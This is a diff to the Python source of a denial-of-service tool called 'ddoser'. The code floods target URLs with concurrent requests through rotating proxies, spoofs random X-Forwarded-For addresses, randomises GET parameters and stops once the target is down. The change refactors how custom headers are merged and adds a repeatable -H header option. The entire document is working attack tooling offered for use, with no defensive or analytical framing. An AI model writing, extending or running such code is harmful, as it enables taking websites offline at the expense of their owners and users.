@@ -61,7 +61,7 @@ async def make_request(url: str, proxy: Proxy, timeout: int, headers: Dict[str, 
         STATS['success'] += 1
 
 
-def get_proxy(proxy_iterator: Iterable[Proxy]) -> str:
+def get_proxy(proxy_iterator: Iterable[Proxy]) -> Proxy:
     try:
         return next(proxy_iterator)
     except StopIteration:
@@ -78,19 +78,16 @@ def prepare_url(url: str, with_random_get_param: bool):
     return url
 
 
-def make_headers(user_agent: str, random_xff_ip: bool, custom_headers: str, target_headers: List[Tuple[str, str]]) -> Dict[str, str]:
+def make_headers(
+        user_agent: str, random_xff_ip: bool, custom_headers: Dict[str, str],  target_headers: List[Tuple[str, str]]
+) -> Dict[str, str]:
     headers = {}
     if user_agent:
         headers['user-agent'] = user_agent
     if random_xff_ip:
         headers['x-forwarded-for'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
     if custom_headers:
-        try:
-            custom_headers_dict = json.loads(custom_headers)
-        except ValueError:
-            logging.error('Custom header not applied - incorrect json')
-        else:
-            headers.update(custom_headers_dict)
+        headers.update(custom_headers)
     if target_headers:
         headers.update(target_headers)
     return headers
@@ -104,8 +101,8 @@ def split_target(target: str):
 
 async def ddos(
         target: str, timeout: int, count: int, proxy_iterator: Iterable[Proxy],
-        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
-        stop_attack: int
+        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool,
+        custom_headers: Dict[str, str], stop_attack: int
 ):
     target_url, target_headers = split_target(target)
     step = 0
@@ -129,8 +126,8 @@ def log_stats():
 
 async def amain(
         targets: List[str], timeout: int, concurrency: int, count: int, proxies: List[Proxy],
-        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool, custom_headers: str,
-        stop_attack: int
+        with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool,
+        custom_headers: Dict[str, str], stop_attack: int
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
@@ -164,7 +161,7 @@ def process(
         target_url: Tuple[str], target_urls_file: Tuple[str], proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, with_random_get_param: bool,
         user_agent: str, verbose: bool, ignore_response: bool, log_to_stdout: bool, random_xff_ip: bool,
-        custom_headers: str, stop_attack: int, shuffle_proxy: bool
+        custom_headers: Dict[str, str], stop_attack: int, shuffle_proxy: bool
 ):
     config_logger(verbose, log_to_stdout)
     uvloop.install()
@@ -192,6 +189,15 @@ def process(
     logging.info('success: %s', STATS["success"])
 
 
+def merge_headers(custom_headers: str, header: List[Tuple[str, str]]) -> Dict[str, str]:
+    headers = {}
+    if header:
+        headers.update(header)
+    if custom_headers:
+        headers.update(json.loads(custom_headers))
+    return headers
+
+
 @click.command(help="Run ddoser")
 @click.option('--target-url', help='ddos target url', multiple=True)
 @click.option('--target-urls-file', help='path or url to file contains urls to ddos', multiple=True)
@@ -210,16 +216,18 @@ def process(
 @click.option('--custom-headers', help='set custom headers as json', default='{}', type=str)
 @click.option('--stop-attack', help='stop the attack when the target is down after N tries', type=int, default=0)
 @click.option('--shuffle-proxy', help='Shuffle proxy list on application start', is_flag=True, default=False)
+@click.option('-H', '--header', multiple=True, help='custom header', type=(str, str))
 def main(
         target_url: str, target_urls_file: str, proxy_url: str, proxy_file: str,
         concurrency: int, count: int, timeout: int, verbose: bool, ignore_response: bool, with_random_get_param: bool,
         user_agent: str, log_to_stdout: str, restart_period: int, random_xff_ip: bool, custom_headers: str,
-        stop_attack: int, shuffle_proxy: bool
+        stop_attack: int, shuffle_proxy: bool, header: List[Tuple[str, str]],
 ):
     config_logger(verbose, log_to_stdout)
     if not target_urls_file and not target_url:
         raise SystemExit('--target-url or --target-urls-file is required')
     while True:
+        custom_headers = merge_headers(custom_headers, header)
         proc = multiprocessing.Process(
             target=process,
             args=(target_url, target_urls_file, proxy_url, proxy_file,
